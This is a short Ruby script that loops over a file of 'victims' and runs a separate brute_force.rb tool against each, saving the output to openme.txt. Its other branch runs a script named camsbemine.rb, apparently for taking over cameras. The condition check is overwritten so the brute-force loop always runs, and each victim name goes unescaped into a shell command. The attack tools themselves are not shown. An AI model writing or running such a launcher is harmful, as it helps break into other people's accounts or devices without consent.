#!/bin/ruby

sitecheck = system("grep alias script.html")
sitecheck = true
if sitecheck == true
  victims = IO.readlines("victims.txt")
  victims.each do |victim|
  system("rm -r openme.txt")
  system("ruby brute_force.rb #{victim} | tee openme.txt")
end
else
  system("chmod +x removefirstline.sh")
  system("./removefirstline.sh")
  system("ruby camsbemine.rb")
end
